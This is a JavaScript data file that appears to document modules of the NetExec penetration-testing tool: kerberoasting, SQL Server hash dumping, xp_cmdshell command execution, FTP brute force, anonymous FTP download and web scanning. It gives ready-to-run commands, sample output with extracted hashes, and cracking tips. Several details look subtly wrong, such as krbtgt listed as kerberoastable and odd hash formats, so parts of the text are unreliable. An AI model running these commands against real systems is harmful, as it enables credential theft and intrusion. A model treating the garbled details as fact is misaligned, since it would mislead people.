    description: 'The kerberoasting module identifies and extracts service account Kerberos tickets that can be cracked offline to reveal plaintext passwords.',
    stability: 'stable',
    example: 'netexec ldap 192.168.1.10 -u user -p \'Password123!\' -M kerberoasting',
    optionalParams: [
      { name: '--target-spn', description: 'Target specific Service Principal Name', default: 'None' },
      { name: '--output-file', description: 'Save tickets to file', default: 'None' },
      { name: '--format', description: 'Output format (hashcat/john)', default: 'hashcat' }
    ],
    examples: [
      { 
        description: 'Extract all service tickets', 
        command: 'netexec ldap 192.168.1.10 -u user -p \'Password123!\' -M kerberoasting' 
      },
      { 
        description: 'Target specific SPN and save to file', 
        command: 'netexec ldap 192.168.1.10 -u user -p \'Password123!\' -M kerberoasting -o TARGET_SPN="MSSQLSvc/db.corp.local" OUTPUT_FILE=mssql-tickets.txt' 
      }
    ],
    output: 'LDAP        192.168.1.10    389    DC01        [*] Windows Server 2019 (name:DC01) (domain:CORP)\nLDAP        192.168.1.10    389    DC01        [+] CORP\\\\user:Password123!\nLDAP        192.168.1.10    389    DC01        [+] Executing kerberoasting module...\nLDAP        192.168.1.10    389    DC01        [+] Found 3 kerberoastable accounts\nLDAP        192.168.1.10    389    DC01        [+] SPN: MSSQLSvc/DB01.CORP.LOCAL\nLDAP        192.168.1.10    389    DC01        [+] CORP.LOCAL/sqlservice:$krb5tgs$23$*sqlservice$CORP.LOCAL$MSSQLSvc/DB01.CORP.LOCAL*$631332e4cd753dd3307c924c102d15fa$f3bc3d7dc...\nLDAP        192.168.1.10    389    DC01        [+] SPN: HTTP/WEBAPP.CORP.LOCAL\nLDAP        192.168.1.10    389    DC01        [+] CORP.LOCAL/webservice:$krb5tgs$23$*webservice$CORP.LOCAL$HTTP/WEBAPP.CORP.LOCAL*$98f15d01c28c45a9d4ae5a5ca716af31$4e961d82e...\nLDAP        192.168.1.10    389    DC01        [+] SPN: ldap/DC01.CORP.LOCAL\nLDAP        192.168.1.10    389    DC01        [+] CORP.LOCAL/krbtgt:$krb5tgs$23$*krbtgt$CORP.LOCAL$ldap/DC01.CORP.LOCAL*$938828c7e9db59291b57c85bda87cc99$736ef4ea7...',
    troubleshooting: [
      'This attack works with any valid domain user account, admin privileges are not required.',
      'Some environments have mitigations like strong service account passwords or AES encryption.',
      'For larger environments, you may need to increase timeout values.',
      'Use hashcat with mode 13100 to crack the extracted hashes.'
    ],
    parameters: [
      { name: 'target-spn', description: 'Target specific Service Principal Name' },
      { name: 'output-file', description: 'Save tickets to file' },
      { name: 'format', description: 'Output format (hashcat/john)' }
    ]
  },
  
  // MSSQL Protocol Modules
  {
    name: 'mssql_hashdump',
    protocol: 'mssql',
    description: 'The mssql_hashdump module extracts SQL Server user hashes from the database, which can be used for offline cracking or pass-the-hash attacks.',
    stability: 'stable',
    example: 'netexec mssql 192.168.1.10 -u sa -p \'Password123!\' -M mssql_hashdump',
    optionalParams: [
      { name: '--no-bruteforce', description: 'Skip brute force of weak passwords after extracting hashes', default: 'False' },
      { name: '--output-file', description: 'Save hashes to file', default: 'None' }
    ],
    examples: [
      { 
        description: 'Extract SQL Server hashes', 
        command: 'netexec mssql 192.168.1.10 -u sa -p \'Password123!\' -M mssql_hashdump' 
      },
      { 
        description: 'Save extracted hashes to file', 
        command: 'netexec mssql 192.168.1.10 -u sa -p \'Password123!\' -M mssql_hashdump -o OUTPUT_FILE=sqlhashes.txt' 
      }
    ],
    output: 'MSSQL       192.168.1.10    1433   SQLSERVER    [*] Windows 10 or Windows Server 2019 (name:SQLSERVER) (domain:CORP)\nMSSQL       192.168.1.10    1433   SQLSERVER    [+] Connection successful with sa:Password123! (admin)\nMSSQL       192.168.1.10    1433   SQLSERVER    [+] Executing mssql_hashdump module...\nMSSQL       192.168.1.10    1433   SQLSERVER    [+] Extracting MSSQL hashes...\nMSSQL       192.168.1.10    1433   SQLSERVER    sql_svc:0x0200F733058A07A8025DB4348458D771780ABE1CD8019605706F142F382A17E73CB1051F2C3B3DBC3E0F989C24F658C366A9C9826685497D21CDC600ACFEB6A0D75B2B36E0CB75:0x8AB3888ACBC0A21D97011D23D03BEDE603EF1A07F5D9B19E77777A6C:NTHASH\nMSSQL       192.168.1.10    1433   SQLSERVER    sa:0x0200A9EBD0F4A12BB7C3F0CC1BB513B128A32EF42C8401A42E7E45AFC83B0E6EB94EEE6C32111F36CCC9B6E558AC973C1F93931453C80275DD6BEACE92E7452A58E92C5:0x896E5F99E54A41D3CE39C32B94D31802B9EEFBBDFCBD9:NTHASH\nMSSQL       192.168.1.10    1433   SQLSERVER    testuser:0x02002673C455A6F1C9F10D86C56C8C91EDC2961FDF8D48FB0533328CDD031F10B70E7B32D4C8932FD82BAC6D915005C9EB381A2D39F8E1E63209BA37D838C397048F8AB1:0x9CCD56A24B15D28A4A7336D4233B:NTHASH\nMSSQL       192.168.1.10    1433   SQLSERVER    [+] Attempting to brute-force extracted hashes...\nMSSQL       192.168.1.10    1433   SQLSERVER    testuser:Password1\nMSSQL       192.168.1.10    1433   SQLSERVER    [+] MSSQL hashes written to: ~/.netexec/logs/192.168.1.10_mssql_hashes.txt',
    troubleshooting: [
      'This module requires sysadmin privileges on the SQL Server.',
      'Some versions of SQL Server may have different hash formats.',
      'For newer SQL Server versions, make sure the instance allows xp_cmdshell execution.',
      'To crack the extracted hashes, you need specialized tools like hashcat with the appropriate mode.'
    ],
    parameters: [
      { name: 'no-bruteforce', description: 'Skip brute force of weak passwords' },
      { name: 'output-file', description: 'Save hashes to file' }
    ]
  },
  {
    name: 'xpcmdshell',
    protocol: 'mssql',
    description: 'The xpcmdshell module allows execution of arbitrary commands on the target server through SQL Server\'s xp_cmdshell stored procedure.',
    stability: 'stable',
    example: 'netexec mssql 192.168.1.10 -u sa -p \'Password123!\' -M xpcmdshell -o COMMAND="whoami"',
    requiredParams: ['command'],
    optionalParams: [
      { name: '--no-output', description: 'Do not retrieve command output', default: 'False' }
    ],
    examples: [
      { 
        description: 'Execute basic command', 
        command: 'netexec mssql 192.168.1.10 -u sa -p \'Password123!\' -M xpcmdshell -o COMMAND="whoami"' 
      },
      { 
        description: 'Execute system information command', 
        command: 'netexec mssql 192.168.1.10 -u sa -p \'Password123!\' -M xpcmdshell -o COMMAND="systeminfo | findstr /B /C:\\"OS\\""' 
      }
    ],
    output: 'MSSQL       192.168.1.10    1433   SQLSERVER    [*] Windows 10 or Windows Server 2019 (name:SQLSERVER) (domain:CORP)\nMSSQL       192.168.1.10    1433   SQLSERVER    [+] Connection successful with sa:Password123! (admin)\nMSSQL       192.168.1.10    1433   SQLSERVER    [+] Executing xpcmdshell module...\nMSSQL       192.168.1.10    1433   SQLSERVER    [+] Enabling xp_cmdshell...\nMSSQL       192.168.1.10    1433   SQLSERVER    [+] Successfully enabled xp_cmdshell\nMSSQL       192.168.1.10    1433   SQLSERVER    [+] Executing command: whoami\nMSSQL       192.168.1.10    1433   SQLSERVER    [+] Command output:\nMSSQL       192.168.1.10    1433   SQLSERVER    corp\\sql_service',
    troubleshooting: [
      'This module requires sysadmin privileges on the SQL Server.',
      'The xp_cmdshell feature may be disabled by default in some environments.',
      'Commands execute in the context of the SQL Server service account.',
      'Command output is limited to text; binary output will not work properly.'
    ],
    parameters: [
      { name: 'command', description: 'Command to execute on the target' },
      { name: 'no-output', description: 'Do not retrieve command output' }
    ]
  },
  
  // FTP Protocol Modules
  {
    name: 'ftp_bruteforce',
    protocol: 'ftp',
    description: 'The ftp_bruteforce module attempts to authenticate to FTP servers using a list of common credentials or a custom wordlist.',
    stability: 'stable',
    example: 'netexec ftp 192.168.1.10 -u userlist.txt -p passlist.txt -M ftp_bruteforce',
    optionalParams: [
      { name: '--threads', description: 'Number of concurrent threads for brute force', default: '10' },
      { name: '--timeout', description: 'Timeout in seconds for each attempt', default: '5' }
    ],
    examples: [
      { 
        description: 'Brute force FTP with userlist and password list', 
        command: 'netexec ftp 192.168.1.10 -u userlist.txt -p passlist.txt -M ftp_bruteforce' 
      },
      { 
        description: 'Brute force with higher thread count', 
        command: 'netexec ftp 192.168.1.10 -u userlist.txt -p passlist.txt -M ftp_bruteforce -o THREADS=20' 
      }
    ],
    output: 'FTP         192.168.1.10    21     FTP-SERVER   [*] Starting FTP bruteforce module...\nFTP         192.168.1.10    21     FTP-SERVER   [+] Using 10 threads for brute force attempts\nFTP         192.168.1.10    21     FTP-SERVER   [-] anonymous:anonymous - Authentication failed\nFTP         192.168.1.10    21     FTP-SERVER   [-] admin:admin - Authentication failed\nFTP         192.168.1.10    21     FTP-SERVER   [-] root:root - Authentication failed\nFTP         192.168.1.10    21     FTP-SERVER   [+] ftpuser:ftppass - Authentication successful!\nFTP         192.168.1.10    21     FTP-SERVER   [-] administrator:password - Authentication failed\nFTP         192.168.1.10    21     FTP-SERVER   [+] Brute force completed. Found 1 valid credential(s).',
    troubleshooting: [
      'Many FTP servers implement account lockout policies after failed login attempts.',
      'Some FTP servers may have rate limiting that slows down brute force attempts.',
      'Consider using smaller, targeted wordlists for better efficiency.',
      'Increasing thread count may trigger detection systems or cause denial of service.'
    ],
    parameters: [
      { name: 'threads', description: 'Number of concurrent threads for brute force' },
      { name: 'timeout', description: 'Timeout in seconds for each attempt' }
    ]
  },
  {
    name: 'anonymous_download',
    protocol: 'ftp',
    description: 'The anonymous_download module attempts to access an FTP server using anonymous credentials and downloads available files if accessible.',
    stability: 'beta',
    example: 'netexec ftp 192.168.1.10 -M anonymous_download',
    optionalParams: [
      { name: '--path', description: 'Specific path to download files from', default: '/' },
      { name: '--download-limit', description: 'Maximum number of files to download', default: '10' },
      { name: '--output-dir', description: 'Local directory to save downloaded files', default: './ftp_downloads' }
    ],
    examples: [
      { 
        description: 'Download files from anonymous FTP', 
        command: 'netexec ftp 192.168.1.10 -M anonymous_download' 
      },
      { 
        description: 'Download from specific directory with higher limit', 
        command: 'netexec ftp 192.168.1.10 -M anonymous_download -o PATH="/pub" DOWNLOAD_LIMIT=50' 
      }
    ],
    output: 'FTP         192.168.1.10    21     FTP-SERVER   [*] Starting anonymous_download module...\nFTP         192.168.1.10    21     FTP-SERVER   [+] Anonymous access allowed\nFTP         192.168.1.10    21     FTP-SERVER   [+] Listing files in /\nFTP         192.168.1.10    21     FTP-SERVER   [+] Found 5 files/directories\nFTP         192.168.1.10    21     FTP-SERVER   [+] Downloading readme.txt (2.5 KB)\nFTP         192.168.1.10    21     FTP-SERVER   [+] Downloading public_files.zip (150 KB)\nFTP         192.168.1.10    21     FTP-SERVER   [+] Downloading: welcome.txt (1.2 KB)\nFTP         192.168.1.10    21     FTP-SERVER   [+] Download complete. 3 files downloaded to ./ftp_downloads',
    troubleshooting: [
      'Many modern FTP servers disable anonymous access by default.',
      'Some servers allow anonymous login but restrict browsing or downloading.',
      'Large files may time out during download; adjust timeout settings if needed.',
      'Binary files may need special handling; ensure the FTP client is in the appropriate mode.'
    ],
    parameters: [
      { name: 'path', description: 'Specific path to download files from' },
      { name: 'download-limit', description: 'Maximum number of files to download' },
      { name: 'output-dir', description: 'Local directory to save downloaded files' }
    ]
  },
  
  // HTTP Protocol Modules
  {
    name: 'web_scan',
    protocol: 'http',
    description: 'The web_scan module performs a comprehensive scan of web applications, identifying common vulnerabilities and misconfiguration issues.',
    stability: 'beta',
    example: 'netexec http 192.168.1.10 -M web_scan',
    optionalParams: [
      { name: '--scan-depth', description: 'Scan depth (basic, standard, deep)', default: 'standard' },
      { name: '--path', description: 'Base path to start scanning from', default: '/' },
      { name: '--ignore-cert', description: 'Ignore SSL certificate errors', default: 'True' }
    ],
    examples: [
      { 
        description: 'Perform standard web scan', 
        command: 'netexec http 192.168.1.10 -M web_scan' 
      },
      { 
        description: 'Deep scan of specific application path', 
        command: 'netexec http 192.168.1.10 -M web_scan -o SCAN_DEPTH=deep PATH="/app/"' 
      }
    ],
    output: 'HTTP        192.168.1.10    80     WEBSERVER    [*] Starting web_scan module...\nHTTP        192.168.1.10    80     WEBSERVER    [+] Server header: Apache/2.4.41 (Ubuntu)\nHTTP        192.168.1.10    80     WEBSERVER    [+] Detected web application: WordPress 5.8.2\nHTTP        192.168.1.10    80     WEBSERVER    [!] Vulnerable plugin detected: contact-form-7 (version 5.4.2)\nHTTP        192.168.1.10    80     WEBSERVER    [+] Found admin login page: /wp-admin/\nHTTP        192.168.1.10    80     WEBSERVER    [!] Directory listing enabled: /wp-content/uploads/\nHTTP        192.168.1.10    80     WEBSERVER    [+] Found 3 potential security issues.\nHTTP        192.168.1.10    80     WEBSERVER    [+] Full report saved to: ~/.netexec/logs/webscan_192.168.1.10_20230210.txt',
    troubleshooting: [
      'Web application firewalls may block scanning attempts.',
      'Rate limiting might affect scan results; use lower scan depths for initial assessment.',
      'Scan results may contain false positives; manual verification is recommended.',
      'Scan performance depends on target server response times and complexity.'
    ],
    parameters: [
      { name: 'scan-depth', description: 'Scan depth (basic, standard, deep)' },
      { name: 'path', description: 'Base path to start scanning from' },
      { name: 'ignore-cert', description: 'Ignore SSL certificate errors' }
    ]
  }
];
